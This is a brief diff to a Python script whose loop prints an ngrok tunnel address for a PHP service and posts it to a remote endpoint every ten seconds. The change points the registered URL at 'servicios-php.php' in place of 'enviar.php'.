@@ -65,7 +65,7 @@ tRestore.start()
 while 1:
     time.sleep(10)
     print("NGROK: " + ngrok + "/inf-sec-php-ser/servicios-php.php")
-    dataReact = {"url": "" + ngrok + "/inf-sec-php-ser/enviar.php", "config": ""}
+    dataReact = {"url": "" + ngrok + "/inf-sec-php-ser/servicios-php.php", "config": ""}
 
     try:
         response = requests.post(urlReact, params=params, data=json.dumps(dataReact), headers=headers)
